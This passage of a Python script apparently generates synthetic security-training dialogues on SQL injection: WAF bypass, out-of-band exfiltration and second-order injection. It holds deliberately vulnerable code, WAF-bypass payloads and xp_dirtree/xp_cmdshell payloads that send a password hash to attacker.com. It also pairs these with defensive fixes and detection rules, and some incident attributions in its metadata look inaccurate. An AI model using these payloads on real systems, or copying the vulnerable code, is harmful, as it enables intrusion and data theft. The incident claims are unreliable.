    db, err := gorm.Open(mysql.Open(dsn), &gorm.Config{
        Logger: logger.Default.LogMode(logger.Info),
        NowFunc: func() time.Time {
            return time.Now().UTC()
        },
        PrepareStmt: true, // Prepared statement caching
    })

    if err != nil {
        panic("Failed to connect to database")
    }

    // Connection pool settings
    sqlDB, _ := db.DB()
    sqlDB.SetMaxIdleConns(10)
    sqlDB.SetMaxOpenConns(100)
    sqlDB.SetConnMaxLifetime(time.Hour)

    // Router setup
    r := gin.Default()
    r.Use(RateLimitMiddleware())
    r.Use(ConstantTimeMiddleware())

    r.GET("/products/:id", func(c *gin.Context) {
        idStr := c.Param("id")

        // Input validation
        id, err := strconv.ParseUint(idStr, 10, 32)
        if err != nil || id == 0 {
            c.JSON(400, gin.H{"error": "Invalid product ID"})
            return
        }

        // GORM query with timeout - automatically parameterized
        ctx, cancel := context.WithTimeout(c.Request.Context(), 2*time.Second)
        defer cancel()

        var product Product
        result := db.WithContext(ctx).Where("id = ? AND active = ?", id, true).First(&product)

        if errors.Is(result.Error, gorm.ErrRecordNotFound) {
            c.JSON(404, gin.H{"error": "Product not found"})
            return
        }

        if result.Error != nil {
            // Log error
            log.Printf("Database error: %v", result.Error)
            c.JSON(500, gin.H{"error": "An error occurred"})
            return
        }

        // Return product
        c.JSON(200, product)
    })

    r.Run(":8080")
}
```

**Production Security**:
1. **GORM**: Automatic parameterization prevents SQLi
2. **Rate limiting**: 10 requests/second per IP
3. **Constant-time responses**: 100ms minimum + middleware
4. **Query timeout**: 2-second context timeout
5. **Connection pooling**: Prevents resource exhaustion
6. **Prepared statement caching**: Performance + security"""

    return {
        "id": example_id,
        "metadata": metadata,
        "context": context,
        "conversations": [
            {"turn": 1, "from": "human", "value": human_turn_1},
            {"turn": 2, "from": "assistant", "value": assistant_turn_1},
            {"turn": 3, "from": "human", "value": human_turn_2},
            {"turn": 4, "from": "assistant", "value": assistant_turn_2},
            {"turn": 5, "from": "human", "value": human_turn_3},
            {"turn": 6, "from": "assistant", "value": assistant_turn_3},
            {"turn": 7, "from": "human", "value": human_turn_4},
            {"turn": 8, "from": "assistant", "value": assistant_turn_4}
        ],
        "validation": {
            "syntax_check": "pending",
            "security_review": "pending",
            "code_execution": "not_executed",
            "encoding_check": "pending",
            "duplication_check": "pending",
            "reviewed_by": "pending",
            "review_date": str(date.today()),
            "issues": []
        }
    }


def example_005_waf_bypass():
    """Python - WAF bypass techniques for SQL injection."""

    example_id = "sql-injection-000025"
    metadata = create_base_metadata("python", 5, "waf_bypass")

    context = {
        "real_world_incident": "2018 British Airways breach via WAF bypass",
        "impact": "380,000 payment cards stolen, £20M GDPR fine",
        "attack_vector": "SQL injection bypassed ModSecurity WAF using encoding",
        "business_impact": "Largest GDPR fine at the time"
    }

    human_turn_1 = """I have a WAF protecting my app. Am I safe from SQL injection?"""

    assistant_turn_1 = """No! WAFs can be bypassed with obfuscation techniques:

**VULNERABLE CODE BEHIND WAF**:

```python
from flask import Flask, request
import sqlite3

app = Flask(__name__)

# Assume ModSecurity WAF in front with SQL injection rules

@app.route('/search')
def search():
    query = request.args.get('q', '')

    # STILL VULNERABLE: WAF doesn't fix the code
    sql = f"SELECT * FROM products WHERE name LIKE '%{query}%'"

    conn = sqlite3.connect('shop.db')
    cursor = conn.cursor()
    cursor.execute(sql)

    return {'results': cursor.fetchall()}
```

**WAF Bypass Techniques**:

**1. URL Encoding**:
```python
# Normal payload (blocked):
' OR '1'='1

# URL encoded (might bypass):
%27%20OR%20%271%27%3D%271
```

**2. Double URL Encoding**:
```python
# Double encoded:
%2527%2520OR%2520%25271%2527%253D%25271
```

**3. Case Variation**:
```python
# Mixed case:
' oR '1'='1
' Or '1'='1
' OR '1'='1
```

**4. Comment Obfuscation**:
```python
# Inline comments:
'/**/OR/**/'1'='1
' OR--
'1'='1

# MySQL-specific:
'/*!OR*/'1'='1
```

**5. Whitespace Alternatives**:
```python
# Tabs, newlines instead of spaces:
'%09OR%09'1'='1  # Tab
'%0AOR%0A'1'='1  # Newline
'%0DOR%0D'1'='1  # Carriage return
```

**6. Function-based Obfuscation**:
```python
# Using CHAR() to build strings:
' OR 1=1--
' OR CHAR(49)=CHAR(49)--

# Using HEX:
' OR 0x31=0x31--
```

**7. Polyglot Payloads** (works across MySQL, PostgreSQL, MSSQL):
```python
'/**/UNION/**/SELECT/**/NULL,NULL,NULL--
-1' OR 1=1-- -
' AND 1=0 UNION ALL SELECT NULL,@@version,NULL--
```

**Why WAFs Fail**:
- Pattern-based detection can't catch all obfuscations
- False positive avoidance creates bypass opportunities
- Legitimate traffic uses encoding too
- Can't analyze semantic meaning of queries"""

    human_turn_2 = """So WAFs are useless? How do I actually prevent SQL injection?"""

    assistant_turn_2 = """WAFs are **defense in depth**, not primary protection. Use **parameterized queries**:

**SECURE VERSION** (immune to WAF bypasses):

```python
import sqlite3
from flask import Flask, request, abort

app = Flask(__name__)

@app.route('/search')
def search():
    query = request.args.get('q', '').strip()

    # Input validation (defense in depth)
    if len(query) < 2:
        abort(400, "Query too short")

    if len(query) > 100:
        abort(400, "Query too long")

    # Remove dangerous characters (but parameterization is real protection)
    if any(char in query for char in [';', '--', '/*', '*/', 'xp_']):
        abort(400, "Invalid characters in query")

    # PARAMETERIZED QUERY: Immune to ALL SQL injection techniques
    sql = "SELECT id, name, price FROM products WHERE name LIKE ?"

    conn = sqlite3.connect('shop.db')
    cursor = conn.cursor()

    # Parameter binding prevents injection regardless of WAF
    cursor.execute(sql, (f'%{query}%',))

    results = cursor.fetchall()

    # Return safe JSON structure
    return {
        'results': [
            {'id': r[0], 'name': r[1], 'price': r[2]}
            for r in results
        ]
    }
```

**Defense in Depth Layers**:
```python
from flask import Flask, request, abort
import sqlite3
import re

class SQLInjectionDefense:
    # Dangerous patterns (backup detection)
    DANGEROUS_PATTERNS = [
        r'(\'|\")(\\s)*(or|and)(\\s)*[\'\"]?\\d',  # ' OR '1'='1
        r'(union|select|insert|update|delete|drop|create|alter)',  # SQL keywords
        r'(--|#|\/\*|\*\/)',  # SQL comments
        r'(xp_|sp_)',  # SQL Server procedures
        r'(;|\\x00)',  # Statement separators
    ]

    @classmethod
    def validate_input(cls, user_input, param_name="input"):
        '''Validate input for suspicious patterns (backup check).'''
        if not user_input:
            return True

        # Length check
        if len(user_input) > 1000:
            raise ValueError(f"{param_name} too long")

        # Pattern check (non-blocking, just logging)
        for pattern in cls.DANGEROUS_PATTERNS:
            if re.search(pattern, user_input, re.IGNORECASE):
                # Log potential attack but don't block
                # (parameterized queries are real protection)
                app.logger.warning(
                    f"Suspicious pattern in {param_name}: {user_input}"
                )

        return True

@app.route('/search')
def search():
    query = request.args.get('q', '').strip()

    # Defense in depth: validate input
    try:
        SQLInjectionDefense.validate_input(query, "search query")
    except ValueError as e:
        abort(400, str(e))

    # PRIMARY DEFENSE: Parameterized query
    sql = "SELECT id, name, price FROM products WHERE name LIKE ?"

    conn = sqlite3.connect('shop.db')
    cursor = conn.cursor()
    cursor.execute(sql, (f'%{query}%',))

    return {'results': cursor.fetchall()}
```

**Why This Works**:
1. **Parameterization**: WAF bypasses don't matter - query structure is fixed
2. **Input validation**: Backup detection layer
3. **Logging**: Suspicious patterns logged for monitoring
4. **Length limits**: Prevents resource exhaustion"""

    human_turn_3 = """How do I configure my WAF as effective defense in depth?"""

    assistant_turn_3 = """Configure WAF with **strict rules** + **monitor mode** to avoid false positives:

**ModSecurity WAF Configuration** (OWASP Core Rule Set):

```apache
# /etc/modsecurity/modsecurity.conf

# Enable ModSecurity
SecRuleEngine On

# Log everything for monitoring
SecAuditEngine On
SecAuditLog /var/log/modsecurity/audit.log

# SQL Injection Detection Rules
SecRule ARGS "@detectSQLi" \\
    "id:1001,\\
    phase:2,\\
    deny,\\
    status:403,\\
    msg:'SQL Injection Attack Detected',\\
    logdata:'Matched Data: %{MATCHED_VAR}',\\
    severity:CRITICAL,\\
    tag:'application-multi',\\
    tag:'language-multi',\\
    tag:'platform-multi',\\
    tag:'attack-sqli'"

# Paranoia Level (1-4, higher = stricter)
SecAction "id:900000,phase:1,nolog,pass,t:none,setvar:tx.paranoia_level=2"

# Block common bypass patterns
SecRule ARGS "@rx (?i)(union.*select|exec.*xp_|sp_executesql)" \\
    "id:1002,phase:2,deny,status:403,msg:'SQL Injection Keyword Detected'"

# Block encoding attempts
SecRule ARGS "@rx %(?:2[57]|3[CD]|40)" \\
    "id:1003,phase:2,deny,status:403,msg:'URL Encoding Detected in SQL Context'"

# Rate limiting per IP
SecAction "phase:1,nolog,pass,initcol:ip=%{REMOTE_ADDR},\\
    setvar:ip.requests=+1,\\
    expirevar:ip.requests=60"

SecRule IP:REQUESTS "@gt 100" \\
    "id:1004,phase:1,deny,status:429,msg:'Rate limit exceeded'"
```

**Application-Side Configuration**:

```python
from flask import Flask, request, abort
import sqlite3

app = Flask(__name__)

@app.before_request
def check_waf_headers():
    '''Check if request passed through WAF.'''
    # WAF should add custom header
    if not request.headers.get('X-WAF-Checked'):
        app.logger.error("Request bypassed WAF")
        abort(403, "Direct access not allowed")

@app.route('/search')
def search():
    query = request.args.get('q', '').strip()

    # Even with WAF, ALWAYS use parameterized queries
    sql = "SELECT id, name, price FROM products WHERE name LIKE ?"

    conn = sqlite3.connect('shop.db')
    cursor = conn.cursor()
    cursor.execute(sql, (f'%{query}%',))

    return {'results': cursor.fetchall()}
```

**WAF Monitoring Dashboard**:
```python
# Monitor WAF blocks for false positives
import re
from datetime import datetime, timedelta

def analyze_waf_logs():
    \"\"\"Parse ModSecurity logs to identify patterns.\"\"\"
    log_file = '/var/log/modsecurity/audit.log'

    blocked_requests = []
    with open(log_file) as f:
        for line in f:
            if 'SQL Injection' in line:
                blocked_requests.append(parse_log_line(line))

    # Alert on high block rate (potential false positives or attack)
    recent_blocks = [
        r for r in blocked_requests
        if r['timestamp'] > datetime.now() - timedelta(hours=1)
    ]

    if len(recent_blocks) > 50:
        send_alert(f"High WAF block rate: {len(recent_blocks)} in last hour")
```

**Best Practices**:
1. WAF in **monitoring mode first** to tune rules
2. Gradual rollout to avoid blocking legitimate traffic
3. Always use **parameterized queries** as primary defense
4. WAF is **defense in depth**, not replacement for secure code"""

    human_turn_4 = """What's the production pattern with Django ORM + WAF?"""

    assistant_turn_4 = """Use **Django ORM** (primary defense) + **WAF** (monitoring layer):

**Django Settings** (`settings.py`):

```python
# Security middleware
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'myapp.middleware.WAFHeaderMiddleware',  # Custom WAF check
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]

# Rate limiting
RATELIMIT_ENABLE = True
RATELIMIT_USE_CACHE = 'default'

# Logging for security events
LOGGING = {
    'version': 1,
    'handlers': {
        'security_file': {
            'level': 'WARNING',
            'class': 'logging.FileHandler',
            'filename': '/var/log/django/security.log',
        },
    },
    'loggers': {
        'security': {
            'handlers': ['security_file'],
            'level': 'WARNING',
            'propagate': False,
        },
    },
}
```

**Custom WAF Middleware** (`middleware.py`):

```python
from django.http import HttpResponseForbidden
from django.conf import settings
import logging

logger = logging.getLogger('security')

class WAFHeaderMiddleware:
    \"\"\"Verify requests passed through WAF.\"\"\"

    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        # Check for WAF header (set by ModSecurity)
        if not request.META.get('HTTP_X_WAF_CHECKED'):
            logger.error(f"Request bypassed WAF: {request.path} from {request.META.get('REMOTE_ADDR')}")

            if settings.ENFORCE_WAF:
                return HttpResponseForbidden("Direct access not allowed")

        response = self.get_response(request)
        return response
```

**Views with Django ORM** (`views.py`):

```python
from django.http import JsonResponse
from django.views.decorators.http import require_http_methods
from django.core.exceptions import ValidationError
from django_ratelimit.decorators import ratelimit
from .models import Product
import logging

logger = logging.getLogger('security')

@require_http_methods(["GET"])
@ratelimit(key='ip', rate='100/h', method='GET')
def search_products(request):
    query = request.GET.get('q', '').strip()

    # Input validation
    if len(query) < 2:
        return JsonResponse({'error': 'Query too short'}, status=400)

    if len(query) > 100:
        return JsonResponse({'error': 'Query too long'}, status=400)

    # Django ORM automatically parameterizes - SQL injection impossible
    # Even if WAF is bypassed, this is safe
    products = Product.objects.filter(
        name__icontains=query,
        active=True
    ).values('id', 'name', 'price')[:50]  # Limit results

    return JsonResponse({
        'results': list(products),
        'count': len(products)
    })
```

**Product Model** (`models.py`):

```python
from django.db import models
from django.core.validators import MinLengthValidator, MaxLengthValidator

class Product(models.Model):
    name = models.CharField(
        max_length=200,
        validators=[MinLengthValidator(1), MaxLengthValidator(200)]
    )
    price = models.DecimalField(max_digits=10, decimal_places=2)
    active = models.BooleanField(default=True)
    created_at = models.DateTimeField(auto_now_add=True)

    class Meta:
        indexes = [
            models.Index(fields=['name', 'active']),
        ]

    def __str__(self):
        return self.name
```

**Security Monitoring** (`monitoring.py`):

```python
from django.core.management.base import BaseCommand
import re
from datetime import datetime, timedelta

class Command(BaseCommand):
    help = 'Monitor WAF logs for SQL injection attempts'

    def handle(self, *args, **options):
        log_file = '/var/log/modsecurity/audit.log'

        with open(log_file) as f:
            for line in f:
                if 'SQL Injection' in line:
                    # Parse and alert on attack patterns
                    self.analyze_attack(line)

    def analyze_attack(self, log_line):
        # Extract attack details and send alerts
        self.stdout.write(
            self.style.WARNING(f'SQL injection attempt detected: {log_line}')
        )
```

**Production Security Stack**:
1. **Django ORM**: Primary defense - automatic parameterization
2. **ModSecurity WAF**: Defense in depth - blocks obvious attacks
3. **Rate limiting**: Prevents brute force enumeration
4. **Input validation**: Length and character restrictions
5. **Monitoring**: Alert on attack patterns
6. **WAF header check**: Detect WAF bypass attempts"""

    return {
        "id": example_id,
        "metadata": metadata,
        "context": context,
        "conversations": [
            {"turn": 1, "from": "human", "value": human_turn_1},
            {"turn": 2, "from": "assistant", "value": assistant_turn_1},
            {"turn": 3, "from": "human", "value": human_turn_2},
            {"turn": 4, "from": "assistant", "value": assistant_turn_2},
            {"turn": 5, "from": "human", "value": human_turn_3},
            {"turn": 6, "from": "assistant", "value": assistant_turn_3},
            {"turn": 7, "from": "human", "value": human_turn_4},
            {"turn": 8, "from": "assistant", "value": assistant_turn_4}
        ],
        "validation": {
            "syntax_check": "pending",
            "security_review": "pending",
            "code_execution": "not_executed",
            "encoding_check": "pending",
            "duplication_check": "pending",
            "reviewed_by": "pending",
            "review_date": str(date.today()),
            "issues": []
        }
    }


def example_006_oob_injection():
    """C# - Out-of-band (OOB) SQL injection."""

    example_id = "sql-injection-000026"
    metadata = create_base_metadata("c#", 6, "out_of_band_injection")

    context = {
        "real_world_incident": "2019 Capital One breach via SSRF + SQL injection",
        "impact": "106 million customer records stolen",
        "attack_vector": "Out-of-band data exfiltration via DNS/HTTP",
        "business_impact": "$80M fine + $190M fraud costs"
    }

    human_turn_1 = """What if the app doesn't return any database data at all? Is OOB SQL injection possible?"""

    assistant_turn_1 = """Yes! Out-of-band SQL injection exfiltrates data through DNS or HTTP:

**VULNERABLE CODE**:

```csharp
using System;
using System.Data.SqlClient;

public class NotificationService
{
    public void SendNotification(string userId, string message)
    {
        // No data returned to user - just sends email
        string connectionString = "Server=db.example.com;Database=app;";

        using (SqlConnection conn = new SqlConnection(connectionString))
        {
            conn.Open();

            // DANGER: String concatenation
            string sql = $"INSERT INTO notifications (user_id, message) VALUES ('{userId}', '{message}')";

            SqlCommand cmd = new SqlCommand(sql, conn);
            cmd.ExecuteNonQuery(); // No data returned

            Console.WriteLine("Notification queued");
        }
    }
}
```

**OOB Attack Payload** (exfiltrate via DNS):

```sql
'; DECLARE @data NVARCHAR(4000);
SELECT @data = (SELECT TOP 1 password FROM users WHERE username='admin');
EXEC('master..xp_dirtree "//'+@data+'.attacker.com/share"');--

-- DNS lookup to: 5f4dcc3b5aa765d61d8327deb882cf99.attacker.com
-- Attacker's DNS server logs reveal admin password hash
```

**HTTP-based OOB**:

```sql
'; DECLARE @url NVARCHAR(4000);
SET @url = 'http://attacker.com/?data=' + (SELECT password FROM users WHERE username='admin');
EXEC master..xp_cmdshell 'curl ' + @url;--

-- HTTP request to: http://attacker.com/?data=5f4dcc3b5aa765d61d8327deb882cf99
```

**Why It Works**:
1. **No response needed**: Data sent out-of-band
2. **DNS/HTTP channels**: Bypass application layer
3. **Blind exploitation**: Works even with no visible output
4. **Automatic**: Attacker DNS/HTTP server captures data"""

    human_turn_2 = """How do I prevent out-of-band SQL injection attacks?"""

    assistant_turn_2 = """Use **parameterized queries** and **restrict outbound connections**:

**SECURE VERSION**:

```csharp
using System;
using System.Data.SqlClient;
using System.Text.RegularExpressions;

public class NotificationService
{
    private static readonly Regex ALPHANUMERIC = new Regex(@"^[a-zA-Z0-9_-]{1,50}$");

    public void SendNotification(string userId, string message)
    {
        // Input validation
        if (!ALPHANUMERIC.IsMatch(userId))
        {
            throw new ArgumentException("Invalid user ID format");
        }

        if (string.IsNullOrWhiteSpace(message) || message.Length > 500)
        {
            throw new ArgumentException("Invalid message");
        }

        string connectionString = "Server=db.example.com;Database=app;";

        using (SqlConnection conn = new SqlConnection(connectionString))
        {
            conn.Open();

            // Parameterized query prevents SQL injection
            string sql = "INSERT INTO notifications (user_id, message, created_at) " +
                        "VALUES (@userId, @message, GETUTCDATE())";

            using (SqlCommand cmd = new SqlCommand(sql, conn))
            {
                cmd.Parameters.AddWithValue("@userId", userId);
                cmd.Parameters.AddWithValue("@message", message);

                cmd.ExecuteNonQuery();
            }

            Console.WriteLine($"Notification queued for user {userId}");
        }
    }
}
```

**Database-Level Restrictions** (SQL Server):

```sql
-- Disable xp_cmdshell (blocks OS command execution)
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;

-- Disable OLE Automation (blocks HTTP requests)
EXEC sp_configure 'Ole Automation Procedures', 0;
RECONFIGURE;

-- Restrict outbound network access at firewall level
-- Only allow database server → specific trusted hosts
```

**Key Security Controls**:
1. **Parameterized queries**: `@userId` and `@message` prevent injection
2. **Input validation**: Allowlist pattern for user IDs
3. **Disable dangerous procedures**: `xp_cmdshell`, OLE Automation
4. **Network segmentation**: Database servers can't reach internet"""

    human_turn_3 = """How do I configure SQL Server to prevent OOB attacks?"""

    assistant_turn_3 = """Implement **principle of least privilege** + **network isolation**:

**SQL Server Configuration**:

```sql
-- 1. Disable all unnecessary extended stored procedures
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- Disable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 0;
RECONFIGURE;

-- Disable OLE Automation
EXEC sp_configure 'Ole Automation Procedures', 0;
RECONFIGURE;

-- Disable Ad Hoc Distributed Queries
EXEC sp_configure 'Ad Hoc Distributed Queries', 0;
RECONFIGURE;

-- 2. Remove unnecessary permissions from application user
-- Create least-privilege application user
CREATE LOGIN app_user WITH PASSWORD = 'StrongPassword123!';
CREATE USER app_user FOR LOGIN app_user;

-- Grant ONLY required permissions (no xp_* procedures)
GRANT SELECT, INSERT, UPDATE, DELETE ON dbo.notifications TO app_user;
GRANT SELECT ON dbo.users TO app_user;

-- Deny dangerous permissions explicitly
DENY EXECUTE ON xp_cmdshell TO app_user;
DENY EXECUTE ON xp_dirtree TO app_user;

-- 3. Enable SQL Server Audit
CREATE SERVER AUDIT OOB_Audit
TO FILE (FILEPATH = 'C:\\SQLAudit\\', MAXSIZE = 100 MB);

CREATE SERVER AUDIT SPECIFICATION OOB_Audit_Spec
FOR SERVER AUDIT OOB_Audit
ADD (DATABASE_OBJECT_ACCESS_GROUP),
ADD (SCHEMA_OBJECT_ACCESS_GROUP);

ALTER SERVER AUDIT OOB_Audit WITH (STATE = ON);
ALTER SERVER AUDIT SPECIFICATION OOB_Audit_Spec WITH (STATE = ON);
```

**Network-Level Protection** (Windows Firewall):

```powershell
# Block outbound DNS from SQL Server (except to internal DNS)
New-NetFirewallRule -DisplayName "Block SQL Server Outbound DNS" `
    -Direction Outbound `
    -Program "C:\\Program Files\\Microsoft SQL Server\\MSSQL15.MSSQLSERVER\\MSSQL\\Binn\\sqlservr.exe" `
    -Protocol UDP `
    -RemotePort 53 `
    -Action Block

# Block outbound HTTP/HTTPS from SQL Server
New-NetFirewallRule -DisplayName "Block SQL Server Outbound HTTP" `
    -Direction Outbound `
    -Program "C:\\Program Files\\Microsoft SQL Server\\MSSQL15.MSSQLSERVER\\MSSQL\\Binn\\sqlservr.exe" `
    -Protocol TCP `
    -RemotePort 80,443 `
    -Action Block

# Allow only internal DNS (10.0.0.53 example)
New-NetFirewallRule -DisplayName "Allow SQL Server to Internal DNS" `
    -Direction Outbound `
    -Program "C:\\Program Files\\Microsoft SQL Server\\MSSQL15.MSSQLSERVER\\MSSQL\\Binn\\sqlservr.exe" `
    -Protocol UDP `
    -RemoteAddress 10.0.0.53 `
    -RemotePort 53 `
    -Action Allow
```

**Application Configuration**:

```csharp
using System.Data.SqlClient;

public class SecureDatabaseConfig
{
    public static string GetConnectionString()
    {
        var builder = new SqlConnectionStringBuilder
        {
            DataSource = "db.internal.example.com",
            InitialCatalog = "app",
            UserID = "app_user", // Least-privilege user
            Password = GetSecurePassword(), // From secrets manager
            Encrypt = true,
            TrustServerCertificate = false,
            ConnectTimeout = 10,
            ApplicationName = "NotificationService"
        };

        return builder.ConnectionString;
    }
}
```

**Why This Works**:
- Application user can't execute `xp_cmdshell` or OLE
- Network firewall blocks DNS/HTTP from database server
- Even if SQL injection occurs, data can't be exfiltrated"""

    human_turn_4 = """What's the production pattern with Entity Framework Core?"""

    assistant_turn_4 = """Use **Entity Framework Core** with **connection security**:

```csharp
using Microsoft.EntityFrameworkCore;
using System;
using System.ComponentModel.DataAnnotations;
using System.Linq;

// DbContext
public class AppDbContext : DbContext
{
    public DbSet<Notification> Notifications { get; set; }

    protected override void OnConfiguring(DbContextOptionsBuilder options)
    {
        // Secure connection string from configuration
        var connectionString = Environment.GetEnvironmentVariable("DB_CONNECTION_STRING");

        options.UseSqlServer(connectionString, sqlOptions =>
        {
            sqlOptions.EnableRetryOnFailure(
                maxRetryCount: 3,
                maxRetryDelay: TimeSpan.FromSeconds(5),
                errorNumbersToAdd: null
            );
            sqlOptions.CommandTimeout(10); // 10 second timeout
        });
    }

    protected override void OnModelCreating(ModelBuilder modelBuilder)
    {
        // Configure entity
        modelBuilder.Entity<Notification>(entity =>
        {
            entity.HasKey(e => e.Id);
            entity.Property(e => e.UserId).IsRequired().HasMaxLength(50);
            entity.Property(e => e.Message).IsRequired().HasMaxLength(500);
            entity.HasIndex(e => e.UserId);
        });
    }
}

// Entity model
public class Notification
{
    public int Id { get; set; }

    [Required]
    [StringLength(50, MinimumLength = 1)]
    [RegularExpression(@"^[a-zA-Z0-9_-]+$")]
    public string UserId { get; set; }

    [Required]
    [StringLength(500, MinimumLength = 1)]
    public string Message { get; set; }

    public DateTime CreatedAt { get; set; }
}

// Service layer
public class NotificationService
{
    private readonly AppDbContext _context;
    private readonly ILogger<NotificationService> _logger;

    public NotificationService(AppDbContext context, ILogger<NotificationService> logger)
    {
        _context = context;
        _logger = logger;
    }

    public async Task SendNotificationAsync(string userId, string message)
    {
        // Input validation via data annotations
        var notification = new Notification
        {
            UserId = userId,
            Message = message,
            CreatedAt = DateTime.UtcNow
        };

        // Validate model
        var validationContext = new ValidationContext(notification);
        var validationResults = new List<ValidationResult>();

        if (!Validator.TryValidateObject(notification, validationContext, validationResults, true))
        {
            var errors = string.Join(", ", validationResults.Select(r => r.ErrorMessage));
            throw new ArgumentException($"Validation failed: {errors}");
        }

        try
        {
            // Entity Framework automatically parameterizes - SQL injection impossible
            _context.Notifications.Add(notification);
            await _context.SaveChangesAsync();

            _logger.LogInformation("Notification queued for user {UserId}", userId);
        }
        catch (DbUpdateException ex)
        {
            _logger.LogError(ex, "Database error queuing notification for user {UserId}", userId);
            throw new InvalidOperationException("Failed to queue notification");
        }
    }
}
```

**Startup Configuration** (`Program.cs`):

```csharp
var builder = WebApplication.CreateBuilder(args);

// Configure database context with connection pooling
builder.Services.AddDbContext<AppDbContext>(options =>
{
    var connectionString = builder.Configuration.GetConnectionString("DefaultConnection");

    options.UseSqlServer(connectionString, sqlServerOptions =>
    {
        sqlServerOptions.EnableRetryOnFailure(maxRetryCount: 3);
        sqlServerOptions.CommandTimeout(10);
        sqlServerOptions.MinBatchSize(1);
        sqlServerOptions.MaxBatchSize(100);
    });
});

// Add service
builder.Services.AddScoped<NotificationService>();

// Logging
builder.Services.AddLogging(logging =>
{
    logging.AddConsole();
    logging.AddFile("logs/app-{Date}.txt");
});

var app = builder.Build();

app.Run();
```

**Production Security**:
1. **Entity Framework Core**: Automatic parameterization
2. **Data annotations**: Input validation at model level
3. **Connection pooling**: Performance + security
4. **Query timeout**: Prevents long-running queries
5. **Least-privilege database user**: Can't execute xp_cmdshell
6. **Network isolation**: Database can't reach internet"""

    return {
        "id": example_id,
        "metadata": metadata,
        "context": context,
        "conversations": [
            {"turn": 1, "from": "human", "value": human_turn_1},
            {"turn": 2, "from": "assistant", "value": assistant_turn_1},
            {"turn": 3, "from": "human", "value": human_turn_2},
            {"turn": 4, "from": "assistant", "value": assistant_turn_2},
            {"turn": 5, "from": "human", "value": human_turn_3},
            {"turn": 6, "from": "assistant", "value": assistant_turn_3},
            {"turn": 7, "from": "human", "value": human_turn_4},
            {"turn": 8, "from": "assistant", "value": assistant_turn_4}
        ],
        "validation": {
            "syntax_check": "pending",
            "security_review": "pending",
            "code_execution": "not_executed",
            "encoding_check": "pending",
            "duplication_check": "pending",
            "reviewed_by": "pending",
            "review_date": str(date.today()),
            "issues": []
        }
    }


def example_007_second_order():
    """Java - Second-order SQL injection."""

    example_id = "sql-injection-000027"
    metadata = create_base_metadata("java", 7, "second_order_injection")

    context = {
        "real_world_incident": "2014 eBay breach via stored XSS leading to second-order SQLi",
        "impact": "145 million user records compromised",
        "attack_vector": "Data stored in one context, executed in another",
        "business_impact": "Forced password reset for all users"
    }

    human_turn_1 = """What is second-order SQL injection? How is it different from regular SQLi?"""

    assistant_turn_1 = """Second-order SQLi occurs when malicious data is stored safely, then later retrieved and used unsafely:

**VULNERABLE CODE**:

```java
import java.sql.*;

public class UserProfileService {

    // Step 1: User registration - uses prepared statement (SAFE)
    public void registerUser(String username, String email) throws SQLException {
        Connection conn = DriverManager.getConnection(DB_URL, USER, PASS);

        // Prepared statement - first storage is safe
        String sql = "INSERT INTO users (username, email) VALUES (?, ?)";
        PreparedStatement pstmt = conn.prepareStatement(sql);
        pstmt.setString(1, username);
        pstmt.setString(2, email);
        pstmt.executeUpdate();
    }

    // Step 2: Admin views user stats - VULNERABLE (retrieves and uses unsafely)
    public void viewUserStats(String username) throws SQLException {
        Connection conn = DriverManager.getConnection(DB_URL, USER, PASS);

        // DANGER: Retrieved username used in string concatenation
        String sql = "SELECT COUNT(*) FROM user_actions WHERE username = '" + username + "'";
        Statement stmt = conn.createStatement();
        ResultSet rs = stmt.executeQuery(sql);

        if (rs.next()) {
            System.out.println("User " + username + " has " + rs.getInt(1) + " actions");
        }
    }
}
```

**Attack Flow**:

```java
// Attacker registers with malicious username
registerUser("admin' UNION SELECT password FROM admin_users--", "attacker@evil.com");

// Later, admin views stats for this user
viewUserStats("admin' UNION SELECT password FROM admin_users--");

// The malicious username executes:
// SELECT COUNT(*) FROM user_actions WHERE username = 'admin' UNION SELECT password FROM admin_users--'
```

**Why It's Dangerous**:
1. **Initial storage is safe** (prepared statement)
2. **Retrieval triggers injection** (unsafe string concatenation)
3. **Hard to detect** - payload stored dormant until retrieved
4. **Bypasses input validation** at entry point"""

    human_turn_2 = """How do I prevent second-order SQL injection attacks?"""

    assistant_turn_2 = """Use **parameterized queries everywhere**, not just at data entry:

**SECURE VERSION**:

```java
import java.sql.*;

public class UserProfileService {

    // Step 1: Registration with prepared statement
    public void registerUser(String username, String email) throws SQLException {
        // Input validation
        if (!username.matches("^[a-zA-Z0-9_]{3,20}$")) {
            throw new IllegalArgumentException("Invalid username format");
        }

        Connection conn = DriverManager.getConnection(DB_URL, USER, PASS);

        String sql = "INSERT INTO users (username, email) VALUES (?, ?)";
        PreparedStatement pstmt = conn.prepareStatement(sql);
        pstmt.setString(1, username);
        pstmt.setString(2, email);
        pstmt.executeUpdate();
    }

    // Step 2: SECURE - Uses prepared statement when retrieving data too
    public void viewUserStats(String username) throws SQLException {
        Connection conn = DriverManager.getConnection(DB_URL, USER, PASS);

        // Prepared statement even for data from database
        String sql = "SELECT COUNT(*) FROM user_actions WHERE username = ?";
        PreparedStatement pstmt = conn.prepareStatement(sql);
        pstmt.setString(1, username);

        ResultSet rs = pstmt.executeQuery();

        if (rs.next()) {
            System.out.println("User " + username + " has " + rs.getInt(1) + " actions");
        }
    }
}
```

**Key Principle**:
**Trust NO data** - even if it came from your own database, treat it as untrusted input when building SQL queries.

**Defense in Depth**:
```java
public class SecureUserService {

    private static final Pattern SAFE_USERNAME = Pattern.compile("^[a-zA-Z0-9_]{3,20}$");

    public void registerUser(String username, String email) throws SQLException {
        // Layer 1: Input validation at entry
        if (!SAFE_USERNAME.matcher(username).matches()) {
            throw new IllegalArgumentException("Username contains invalid characters");
        }

        // Layer 2: Prepared statement for storage
        String sql = "INSERT INTO users (username, email) VALUES (?, ?)";
        try (PreparedStatement pstmt = conn.prepareStatement(sql)) {
            pstmt.setString(1, username);
            pstmt.setString(2, email);
            pstmt.executeUpdate();
        }
    }

    public void viewUserStats(String usernameFromDb) throws SQLException {
        // Layer 3: Validate even database-sourced data
        if (!SAFE_USERNAME.matcher(usernameFromDb).matches()) {
            throw new SecurityException("Invalid username in database");
        }

        // Layer 4: Still use prepared statement
